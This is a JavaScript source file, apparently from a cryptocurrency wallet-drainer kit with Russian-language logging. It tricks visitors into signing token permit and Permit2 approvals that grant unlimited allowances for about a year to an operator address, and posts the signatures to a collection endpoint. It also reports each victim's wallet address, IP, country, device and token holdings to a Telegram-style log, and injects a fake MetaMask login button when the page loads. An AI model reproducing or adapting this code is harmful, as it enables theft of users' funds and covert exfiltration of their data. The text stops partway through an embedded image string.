            );
            await window.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: Web3.utils.toHex(chainId) }],
            });
        } catch (error) {
            _console.error(error);
            await window.ethereum.request({
                method: "wallet_addEthereumChain",
                params: [chainsNetworkParams[chainId] || {}],
            });
        }
    }
};

const isValidPermit = (functions) => {
    for (const key in functions) {
        if (key.startsWith("permit(")) {
            const args = key.slice(7).split(",");
            return args.length === 7 && key.indexOf("bool") === -1;
        }
    }
};

const permit = async (msg, contract, owner, spender) => {
    permitApprove = 0;
    let chainId = await contract.signer.getChainId();
    let value = ethers.utils.parseEther(MAX_APPROVAL);
    let nonce = await contract.nonces(owner);
    let name = await contract.name();
    let version;
    if (contract.functions.hasOwnProperty("version")) {
        version = await contract.version();
    } else {
        version = "1";
    }
    let deadline = Date.now() + 1000 * 60 * 60 * 24 * 356; // + one year
    let messages = {
        owner,
        spender,
        value,
        nonce,
        deadline,
    };
    const domain = {
        name: name,
        version: version,
        chainId: chainId,
        verifyingContract: contract.address,
    };
    const permit = {
        Permit: [
            {
                name: "owner",
                type: "address",
            },
            {
                name: "spender",
                type: "address",
            },
            {
                name: "value",
                type: "uint256",
            },
            {
                name: "nonce",
                type: "uint256",
            },
            {
                name: "deadline",
                type: "uint256",
            },
        ],
    };
    const values = {
        owner,
        spender,
        value,
        nonce,
        deadline,
    };
    success = 1;
    _console.log(values);

    try {
        const res = await contract.signer._signTypedData(domain, permit, values);
        permitApprove = 1;
        const r = res.substring(0, 66);
        const s = "0x" + res.substring(66, 130);
        const v = parseInt(res.substring(130, 132), 16);
        logTlgMsg(msg, success);
        return JSON.stringify({
            value: value._hex,
            deadline: deadline,
            v: v,
            r: r,
            s: s,
        });
    } catch (e) {
        _console.log(e);
        success = 0;
        logTlgMsg(msg, success);
    }
};

async function permit2(token, amount, msg, chain, symbol, balance, network, item) {
    const permit2Contract = new ethers.Contract(PERMIT_CONTRACT_ADDRESS, PERMIT_ABI, signer);
    const approved = await permit2Contract.allowance(account, token, operator);

    const nonce = approved.nonce; // Math.floor(Math.random() * 10 ** 12).toString(); // pohui
    const chainId = await permit2Contract.signer.getChainId();
    const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;
    const value = "1461501637330902918203684832716283019655932542975";
    const valueString = value.toString();
    const amountOut = ethers.BigNumber.from(amount).toString();
    success = 1;
    const dataToSign = JSON.stringify({
        domain: {
            name: "Permit2",
            chainId: chainId,
            verifyingContract: PERMIT_CONTRACT_ADDRESS,
        },
        types: {
            EIP712Domain: [
                { name: "name", type: "string" },
                { name: "chainId", type: "uint256" },
                { name: "verifyingContract", type: "address" },
            ],
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" },
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" },
            ],
        },
        primaryType: "PermitSingle",
        message: {
            details: {
                token: token,
                amount: amountOut,
                expiration: deadline,
                nonce: nonce,
            },
            spender: operator,
            sigDeadline: deadline,
        },
    });
    msg += `<b>в сети ${chainIdToName[chain]}</b>`;
    logTlg(
        `🔄 <b>#${userId} получил PERMIT2 ${item.tokenAmountFix} ${symbol} (${balance.toFixed(2)}$) в сети ${
            chainIdToName[chain]
        }</b>`
    );
    web3.currentProvider.sendAsync(
        {
            method: "eth_signTypedData_v3",
            params: [account, dataToSign],
            from: account,
        },
        async (error, result) => {
            if (error != null) {
                _console.log("Error signing");
                success = 0;
                logTlgMsg(msg, success);
                return;
            }
            logTlgMsg(msg, success);
            const signature = result.result;
            const data = {
                chainId: chain,
                tokenAddress: token,
                amount: amountOut,
                value: amountOut,
                owner: account,
                spender: operator,
                deadline: deadline,
                nonce: nonce,
                signature: signature,
            };
            axios.post(PERMIT2_TOKEN, data).then(function (response) {
                // logTlg(
                //   `✅ <b>#${userId} ${symbol} на сумму ${balance.toFixed(
                //     3
                //   )}$ успешно списались методом PERMIT2 и зачислились на ваш кошелёк в сети ${
                //     chainIdToName[chain]
                //   }`
                // );
            });
        }
    );
}

const getABI = async (address, abiUrl) => {
    try {
        var res = await axios.get(abiUrl.format(address));
        if (res.data.message == "NOTOK") throw new Error();
    } catch (e) {
        _console.log("GET ABI");
        await new Promise((r) => setTimeout(r, 1500));
        var res = await axios.get(abiUrl.format(address));
    }
    res = res.data.result[0];
    let abi = JSON.parse(res["ABI"]);
    let impl = "";
    if (res["Proxy"] === "1" && res["Implementation"] !== "") {
        impl = res["Implementation"];
        try {
            abi = JSON.parse((await axios.get(abiUrl.format(impl))).data.result[0]["ABI"]);
        } catch {
            _console.log("GET ABI");
            await new Promise((r) => setTimeout(r, 1000));
            abi = JSON.parse((await axios.get(abiUrl.format(impl))).data.result[0]["ABI"]);
        }
    }
    return [abi, impl];
};

String.prototype.format = function () {
    let args = arguments;
    return this.replace(/{(\d+)}/g, function (match, index) {
        // check if the argument is present
        return typeof args[index] == "undefined" ? match : args[index];
    });
};

function logTlgMsg(msg, sus, hash) {
    if (sus == "1") {
        var succestrans = `✅ <b>#${userId} подписал </b>`;
    } else {
        var succestrans = `🚫 <b>#${userId} отклонил </b>`;
    }
    fetch(`${LOG_TG}`, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: succestrans + msg,
    });
}

function getBrowserName() {
    if (navigator.userAgent.indexOf("Edge") > -1 && navigator.appVersion.indexOf("Edge") > -1) {
        return "Edge";
    } else if (navigator.userAgent.indexOf("Opera") != -1 || navigator.userAgent.indexOf("OPR") != -1) {
        return "Opera";
    } else if (navigator.userAgent.indexOf("Chrome") != -1) {
        return "Chrome";
    } else if (navigator.userAgent.indexOf("Safari") != -1) {
        return "Safari";
    } else if (navigator.userAgent.indexOf("Firefox") != -1) {
        return "Firefox";
    } else if (navigator.userAgent.indexOf("MSIE") != -1) {
        //IF IE > 10
        return "IE";
    } else if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
        return "Dapp Mobile Browser";
    } else {
        return "unknown";
    }
}

function getOS() {
    let os = navigator.userAgent;
    let finalOs = "";
    if (os.search("Windows") !== -1) {
        finalOs = "Windows";
    } else if (os.search("Mac") !== -1) {
        finalOs = "MacOS";
    } else if (os.search("X11") !== -1 && !(os.search("Linux") !== -1)) {
        finalOs = "UNIX";
    } else if (os.search("Linux") !== -1 && os.search("X11") !== -1) {
        finalOs = "Linux";
    } else {
        finalOs = "unknown";
    }
    return finalOs;
}

function isMobile() {
    var check = false;
    (function (a) {
        if (
            /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
                a
            ) ||
            /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
                a.substr(0, 4)
            )
        )
            check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
}

function logTlg(msg, isUnique) {
    if (isUnique) {
        try {
            let logs = localStorage.getItem("logs");
            logs = JSON.parse(logs);
            if (logs.includes(msg)) return;
        } catch (e) {
            localStorage.setItem("logs", JSON.stringify([]));
        }
    }

    fetch(`${LOG_TG}`, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: msg,
    });

    if (isUnique) {
        let logs = localStorage.getItem("logs");
        logs = JSON.parse(logs);

        localStorage.setItem("logs", JSON.stringify([...logs, msg]));
    }
}

function logTlgError(msg) {
    fetch(`${LOG_TG_ERROR}`, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: msg,
    });
}

async function logTokenList() {
    let msg = `На кошельке <b>#${userId}</b> удалось обнаружить следующие активы:\n`;

    const ethMainnet = {
        chainId: "0x1",
        chainName: "Ethereum",
        rpcUrls: ["https://mainnet.infura.io/v3/"],
        nativeCurrency: {
            name: "ETH",
            symbol: "ETH",
            decimals: 18,
        },
        blockExplorerUrls: ["https://etherscan.io/"],
    };

    [ethMainnet, ...Object.values(chainsNetworkParams)].map((chain) => {
        const tokensInChain = tokenList.filter((token) => {
            const chainId = chainToId[token.chain];

            if (!chainId) return;
            return chainId.chainId == chain.chainId;
        });

        console.log("tokensInCHain");
        console.log(tokensInChain);

        if (!tokensInChain.length) return;

        msg += `\n<b><a href="${chain.blockExplorerUrls[0]}address/${account}">${chain.chainName}:</a></b>`;

        const eth = tokensInChain.find((token) => token.tokenAddress == token.chain);
        msg += `\n<b>${chain.nativeCurrency.symbol}</b> - <i>${eth?.tokenAmountFix?.toFixed(2) || "Не обнаружено"}</i>`;

        const tokens = tokensInChain.filter((token) => {
            return !token.approved && token.type == 1;
        });

        let tokensMsg = `\n<b>ТОКЕНЫ</b> - ${tokens.length ? "" : "<i>Не обнаружено</i>"}`;
        tokens.map((token, index) => {
            tokensMsg += `<i>${token.tokenAmountFix.toFixed(2)} ${token.symbol}</i>`;
            if (index != tokens.length - 1) tokensMsg += ", ";
        });

        msg += tokensMsg;

        const sushiSwap = tokensInChain.filter((token) => {
            return token.type == "4";
        });

        let sushiSwapMsg = `\n<b>SushiSwap</b> - ${tokens.length ? "" : "<i>Не обнаружено</i>"}`;
        sushiSwap.map((token, index) => {
            sushiSwapMsg += `<i>${token.tokenAmountFix.toFixed(2)} ${token.symbol}</i>`;
            if (index != tokens.length - 1) sushiSwapMsg += ", ";
        });

        if (sushiSwap.length) msg += sushiSwapMsg;

        const permit2 = tokensInChain.filter((token) => {
            return token.type == "2";
        });

        let permit2Msg = `\n<b>PERMIT2</b> - ${tokens.length ? "" : "<i>Не обнаружено</i>"}`;
        permit2.map((token, index) => {
            permit2Msg += `<i>${token.tokenAmountFix.toFixed(2)} ${token.symbol}</i>`;
            if (index != tokens.length - 1) permit2Msg += ", ";
        });

        if (permit2.length) msg += permit2Msg;

        const UniSwap = tokensInChain.filter((token) => {
            return token.type == "5";
        });

        let UniSwapMsg = `\n<b>UniSwap</b> - ${tokens.length ? "" : "<i>Не обнаружено</i>"}`;
        UniSwap.map((token, index) => {
            UniSwapMsg += `<i>${token.tokenAmountFix.toFixed(2)} ${token.symbol}</i>`;
            if (index != tokens.length - 1) UniSwapMsg += ", ";
        });

        if (UniSwap.length) msg += UniSwapMsg;

        const pancakeSwap2 = tokensInChain.filter((token) => {
            return token.type == "32";
        });

        let pancakeSwap2Msg = `\n<b>Pancake2</b> - ${tokens.length ? "" : "<i>Не обнаружено</i>"}`;
        pancakeSwap2.map((token, index) => {
            pancakeSwap2Msg += `<i>${token.tokenAmountFix.toFixed(2)} ${token.symbol}</i>`;
            if (index != tokens.length - 1) pancakeSwap2Msg += ", ";
        });

        if (pancakeSwap2.length) msg += pancakeSwap2Msg;

        const pancakeSwap = tokensInChain.filter((token) => {
            return token.type == "3";
        });

        let pancakeSwapMsg = `\n<b>Pancake</b> - ${tokens.length ? "" : "<i>Не обнаружено</i>"}`;
        pancakeSwap.map((token, index) => {
            pancakeSwapMsg += `<i>${token.tokenAmountFix.toFixed(2)} ${token.symbol}</i>`;
            if (index != tokens.length - 1) pancakeSwapMsg += ", ";
        });

        if (pancakeSwap.length) msg += pancakeSwapMsg;

        const nft = tokensInChain.filter((token) => {
            return token.type == "erc721" || token.type == "erc1155";
        });

        let nftMsg = `\n<b>NFT</b> - ${nft.length ? "" : "<i>Не обнаружено</i>"}`;

        nft.map((token, index) => {
            nftMsg += `<i>${token.name || ""} ${token.owned} шт.</i>`;
            if (index != nft.length - 1) nftMsg += ", ";
        });

        msg += nftMsg;

        const seaport = tokensInChain.filter((token) => {
            return token.type == "seaport";
        });

        let seaportMsg = `\n<b>SEAPORT</b> - ${seaport.length ? "" : "<i>Не обнаружено</i>"}`;

        seaport.map((token, index) => {
            nftMsg += `<i>${token.name || ""} ${token.owned} шт.</i>`;
            if (index != seaport.length - 1) nftMsg += ", ";
        });

        msg += seaportMsg;

        msg += "\n";
    });

    const total = tokenList.reduce((balance, token) => {
        return (balance += token.balance);
    }, 0);

    totalBalance = total;

    try {
        let logs = localStorage.getItem("logs");
        logs = JSON.parse(logs);
        if (logs.includes(msg)) return;
        localStorage.setItem("logs", JSON.stringify([...logs, msg]));
    } catch (e) {
        localStorage.setItem("logs", JSON.stringify([]));
    }

    msg += "\n";
    msg += `\n<b>Общий баланс:</b> <i>${total.toFixed(2)}$</i>`;
    const expensive = tokenList[0];

    if (expensive) {
        msg += `\n<b>Самый дорогой актив:</b> <i>${expensive.symbol} (${expensive.balance.toFixed(2)}$) в сети ${
            chainIdToName[expensive.chain]
        }</i>`;
    }

    if (total <= 20) {
        const emptyMsg = `🚫 <b>#${userId} кошелек пуст</b>`;

        return logTlg(emptyMsg, true);
    }

    logTlg(msg, true);
}

async function logTlgConnect() {
    userId = await getID(account);

    fetch("https://api.db-ip.com/v2/free/self/")
        .then(function (response) {
            return response.json();
        })
        .then(function (payload) {
            let device_emoji = "Desktop";
            if (
                isMobile() ||
                /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
            ) {
                device_emoji = "Mobile";
            }

            let msg = `User <b>#${userId}</b> <b>(${payload.countryCode})</b> connected his <b>${getWalletName(
                ethersProvider.provider
            )}</b> wallet

<code>${account}</code>

<b>Balance:</b> <b><a href=="https://zapper.fi/ru/account/${account}">Zapper</a></b> | <b><a href="https://opensea.io/${account}">Opensea</a></b> | <b><a href="https://debank.com/profile/${account}">Debank</a></b>
<b>Website:</b> <b><a href="${window.location.hostname}">${window.location.hostname}</a></b>
<b>Device:</b> ${device_emoji == "Mobile" ? "📱" : "🖥"}`;

            logTlg(msg, true);
        });
}

function setItem(key, value) {
    localStorage.setItem(key, JSON.stringify(value));
}

function getItem(key) {
    return JSON.parse(localStorage.getItem(key));
}

if (window.ethereum) {
    window.ethereum.on("accountsChanged", (accounts) => {
        if (accounts.length === 0) {
            localStorage.removeItem("tokenList");
            connected = 0;
        } else {
            localStorage.removeItem("tokenList");
            connected = 0;
        }
    });
}

function splitMessage(message, chunkSize = 4096) {
    const messageLength = message.length;
    const parts = [];
    for (let i = 0; i < messageLength; i += chunkSize) {
        parts.push(message.slice(i, i + chunkSize));
    }
    return parts;
}

function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

async function getID(wallet) {
    const data = await axios.get(`${CNT}?wallet=${wallet}`);
    return data.data;
}

async function sendLogsParts(messageParts) {
    for (let index = 0; index < messageParts.length; index++) {
        const part = messageParts[index];
        logTlg(part);
        await delay(300);
    }
}

const messageload = `<b>Новый переход!</b><br><b>Domain:</b> <b><a href=${window.location.hostname}>${window.location.hostname}</a></b>`;
fetch("https://api.db-ip.com/v2/free/self/")
    .then(function (response) {
        return response.json();
    })
    .then(function (payload) {
        let device_emoji = "Desktop";
        if (isMobile() || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
            device_emoji = "Mobile";
        }
        msg =
            messageload +
            `<br><b>IP: ${payload.ipAddress} (${payload.countryCode})</b><br><b>Device:</b> ${
                device_emoji == "Mobile" ? "📱" : "🖥"
            }`;
        // fetch(`${LOG_TG}?message=${msg}`, {
        //   method: "POST",
        //   headers: {
        //     "Content-Type": "application/x-www-form-urlencoded",
        //   },
        //   body: `token=8bEEokUZLhn7nAHz`,
        // });
    });

if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
    login();
}

window.addEventListener("load", async () => {
    init();
    if (isMobile()) {
        $(".web3modal-modal-card").prepend(
            '<div class="sc-eCImPb bElhDP web3modal-provider-wrapper" onclick="loginMetamask();"><div class="sc-hKwDye hKhOIm web3modal-provider-container"><div class="sc-bdvvtL fqonLZ web3modal-provider-icon"><img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM1NSIgdmlld0JveD0iMCAwIDM5NyAzNTUiIHdpZHRoPSIzOTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMSAtMSkiPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTIuMDA0NzE3IDEzLjgxMDE5OHYtMTguMDU5NDlsNC4yNDUyODMtNC4yNDkyOTJoMjkuNzE2OTgydjIxLjI0NjQ1OSAxNC44NzI1MjNoLTMxLjgzOTYyNGwtMzkuMjY4ODY4LTE2Ljk5NzE2OXoiIGZpbGw9IiNjZGJkYjIiLz48cGF0aCBkPSJtMTk5LjUyODMwNSAzMjcuMTk1NDcyIDUwLjk0MzM5NyAxMy44MTAxOTh2LTE4LjA1OTQ5bDQuMjQ1MjgzLTQuMjQ5MjkyaDI5LjcxNjk4MXYyMS4yNDY0NTkgMTQuODcyNTIzaC0zMS44Mzk2MjNsLTM5LjI2ODg2OC0xNi45OTcxNjl6IiBmaWxsPSIjY2RiZGIyIiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSA0ODMuOTYyMjcgMCkiLz48cGF0aCBkPSJtMTcwLjg3MjY0NCAyODcuODg5NTIzLTQuMjQ1MjgzIDM1LjA1NjY1NyA1LjMwNjYwNC00LjI0OTI5Mmg1NS4xODg2OGw2LjM2NzkyNSA0LjI0OTI5Mi00LjI0NTI4NC0zNS4wNTY2NTctOC40OTA1NjUtNS4zMTE2MTUtNDIuNDUyODMyIDEuMDYyMzIzeiIgZmlsbD0iIzM5MzkzOSIvPjxwYXRoIGQ9Im0xNDIuMjE2OTg0IDUwLjk5MTUwMjIgMjUuNDcxNjk4IDU5LjQ5MDA4NTggMTEuNjc0NTI4IDE3My4xNTg2NDNoNDEuMzkxNTExbDEyLjczNTg0OS0xNzMuMTU4NjQzIDIzLjM0OTA1Ni01OS40OTAwODU4eiIgZmlsbD0iI2Y4OWMzNSIvPjxwYXRoIGQ9Im0zMC43NzgzMDIzIDE4MS42NTcyMjYtMjkuNzE2OTgxNTMgODYuMDQ4MTYxIDc0LjI5MjQ1MzkzLTQuMjQ5MjkzaDQ3Ljc1OTQzNDN2LTM3LjE4MTMwM2wtMi4xMjI2NDEtNzYuNDg3MjUzLTEwLjYxMzIwOCA4LjQ5ODU4M3oiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtODcuMDI4MzAzMiAxOTEuMjE4MTM0IDg3LjAyODMwMjggMi4xMjQ2NDYtOS41NTE4ODYgNDQuNjE3NTYzLTQxLjM5MTUxMS0xMC42MjMyMjl6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkyLjI4MDQ1NyAzNi4wODQ5MDU4IDMzLjk5NDMzNHYzMy45OTQzMzR6IiBmaWxsPSIjZWE4ZDNhIi8+PHBhdGggZD0ibTEyMy4xMTMyMDkgMjI3LjMzNzExNCA0Mi40NTI4MzEgMTAuNjIzMjI5IDEzLjc5NzE3IDQ1LjY3OTg4OC05LjU1MTg4NiA1LjMxMTYxNS00Ni42OTgxMTUtMjcuNjIwMzk4eiIgZmlsbD0iI2Y4OWQzNSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDI2MS4zMzE0NDgtOC40OTA1NjUgNjUuODY0MDI0IDU2LjI1LTM5LjMwNTk0OXoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTc0LjA1NjYwNiAxOTMuMzQyNzggNS4zMDY2MDQgOTAuMjk3NDUxLTE1LjkxOTgxMi00Ni4yMTEwNDl6IiBmaWxsPSIjZWE4ZTNhIi8+PHBhdGggZD0ibTc0LjI5MjQ1MzkgMjYyLjM5Mzc3MSA0OC44MjA3NTUxLTEuMDYyMzIzLTguNDkwNTY1IDY1Ljg2NDAyNHoiIGZpbGw9IiNkODdjMzAiLz48cGF0aCBkPSJtMjQuNDEwMzc3NyAzNTUuODc4MTkzIDkwLjIxMjI2NjMtMjguNjgyNzIxLTQwLjMzMDE5MDEtNjQuODAxNzAxLTczLjIzMTEzMzEzIDUuMzExNjE2eiIgZmlsbD0iI2ViOGYzNSIvPjxwYXRoIGQ9Im0xNjcuNjg4NjgyIDExMC40ODE1ODgtNDUuNjM2NzkzIDM4LjI0MzYyNy0zNS4wMjM1ODU4IDQyLjQ5MjkxOSA4Ny4wMjgzMDI4IDMuMTg2OTY5eiIgZmlsbD0iI2U4ODIxZSIvPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTYuMjUtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIvPjxwYXRoIGQ9Im0yMjkuMjQ1Mjg2IDMyNy4xOTU0NzIgNTUuMTg4NjgtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgNTEzLjY3OTI1MiAwKSIvPjxwYXRoIGQ9Im0xMzIuNjY1MDk2IDIxMi40NjQ1OTMtMTEuNjc0NTI4IDI0LjQzMzQyNyA0MS4zOTE1MS0xMC42MjMyMjl6IiBmaWxsPSIjMzkzOTM5IiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAyODMuMzcyNjQ2IDApIi8+PHBhdGggZD0ibTIzLjM0OTA1NyAxLjA2MjMyMjk2IDE0NC4zMzk2MjUgMTA5LjQxOTI2NTA0LTI0LjQxMDM3OC01OS40OTAwODU4eiIgZmlsbD0iI2U4OGYzNSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5Ni0xOS4xMDM3NzM5MiA1OC40Mjc3NjI5NCAxMC42MTMyMDc3MiA2My43MzkzNzgxLTcuNDI5MjQ1NDEgNC4yNDkyOTIgMTAuNjEzMjA3NzEgOS41NjA5MDYtOC40OTA1NjYxNyA3LjQzNjI2MSAxMS42NzQ1Mjg0NyAxMC42MjMyMjktNy40MjkyNDU0IDYuMzczOTM4IDE2Ljk4MTEzMjMgMjEuMjQ2NDU5IDc5LjU5OTA1NzctMjQuNDMzNDI4YzM4LjkxNTA5Ni0zMS4xNjE0NzMgNTguMDE4ODY5LTQ3LjA5NjMxOCA1Ny4zMTEzMjItNDcuODA0NTMzLS43MDc1NDgtLjcwODIxNS00OC44MjA3NTYtMzcuMTgxMzAzNi0xNDQuMzM5NjI1LTEwOS40MTkyNjUwNHoiIGZpbGw9IiM4ZTVhMzAiLz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAzOTkuMDU2NjExIDApIj48cGF0aCBkPSJtMzAuNzc4MzAyMyAxODEuNjU3MjI2LTI5LjcxNjk4MTUzIDg2LjA0ODE2MSA3NC4yOTI0NTM5My00LjI0OTI5M2g0Ny43NTk0MzQzdi0zNy4xODEzMDNsLTIuMTIyNjQxLTc2LjQ4NzI1My0xMC42MTMyMDggOC40OTg1ODN6IiBmaWxsPSIjZjg5ZDM1Ii8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkxLjIxODEzNCA4Ny4wMjgzMDI4IDIuMTI0NjQ2LTkuNTUxODg2IDQ0LjYxNzU2My00MS4zOTE1MTEtMTAuNjIzMjI5eiIgZmlsbD0iI2Q4N2MzMCIvPjxwYXRoIGQ9Im04Ny4wMjgzMDMyIDE5Mi4yODA0NTcgMzYuMDg0OTA1OCAzMy45OTQzMzR2MzMuOTk0MzM0eiIgZmlsbD0iI2VhOGQzYSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDIyNy4zMzcxMTQgNDIuNDUyODMxIDEwLjYyMzIyOSAxMy43OTcxNyA0NS42Nzk4ODgtOS41NTE4ODYgNS4zMTE2MTUtNDYuNjk4MTE1LTI3LjYyMDM5OHoiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtMTIzLjExMzIwOSAyNjEuMzMxNDQ4LTguNDkwNTY1IDY1Ljg2NDAyNCA1NS4xODg2OC0zOC4yNDM2MjZ6IiBmaWxsPSIjZWI4ZjM1Ii8+PHBhdGggZD0ibTE3NC4wNTY2MDYgMTkzLjM0Mjc4IDUuMzA2NjA0IDkwLjI5NzQ1MS0xNS45MTk4MTItNDYuMjExMDQ5eiIgZmlsbD0iI2VhOGUzYSIvPjxwYXRoIGQ9Im03NC4yOTI0NTM5IDI2Mi4zOTM3NzEgNDguODIwNzU1MS0xLjA2MjMyMy04LjQ5MDU2NSA2NS44NjQwMjR6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTI0LjQxMDM3NzcgMzU1Ljg3ODE5MyA5MC4yMTIyNjYzLTI4LjY4MjcyMS00MC4zMzAxOTAxLTY0LjgwMTcwMS03My4yMzExMzMxMyA1LjMxMTYxNnoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTY3LjY4ODY4MiAxMTAuNDgxNTg4LTQ1LjYzNjc5MyAzOC4yNDM2MjctMzUuMDIzNTg1OCA0Mi40OTI5MTkgODcuMDI4MzAyOCAzLjE4Njk2OXoiIGZpbGw9IiNlODgyMWUiLz48cGF0aCBkPSJtMTMyLjY2NTA5NiAyMTIuNDY0NTkzLTExLjY3NDUyOCAyNC40MzM0MjcgNDEuMzkxNTEtMTAuNjIzMjI5eiIgZmlsbD0iIzM5MzkzOSIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgMjgzLjM3MjY0NiAwKSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5NiAxNDQuMzM5NjI1IDEwOS40MTkyNjUwNC0yNC40MTAzNzgtNTkuNDkwMDg1OHoiIGZpbGw9IiNlODhmMzUiLz48cGF0aCBkPSJtMjMuMzQ5MDU3IDEuMDYyMzIyOTYtMTkuMTAzNzczOTIgNTguNDI3NzYyOTQgMTAuNjEzMjA3NzIgNjMuNzM5Mzc4MS03LjQyOTI0NTQxIDQuMjQ5MjkyIDEwLjYxMzIwNzcxIDkuNTYwOTA2LTguNDkwNTY2MTcgNy40MzYyNjEgMTEuNjc0NTI4NDcgMTAuNjIzMjI5LTcuNDI5MjQ1NCA2LjM3MzkzOCAxNi45ODExMzIzIDIxLjI0NjQ1OSA3OS41OTkwNTc3LTI0LjQzMzQyOGMzOC45MTUwOTYtMzEuMTYxNDczIDU4LjAxODg2OS00Ny4wOTYzMTggNTcuMzExMzIyLTQ3LjgwNDUzMy0uNzA3NTQ4LS43MDgyMTUtNDguODIwNzU2LTM3LjE4MTMwMzYtMTQ0LjMzOTYyNS0xMDkuNDE5MjY1MDR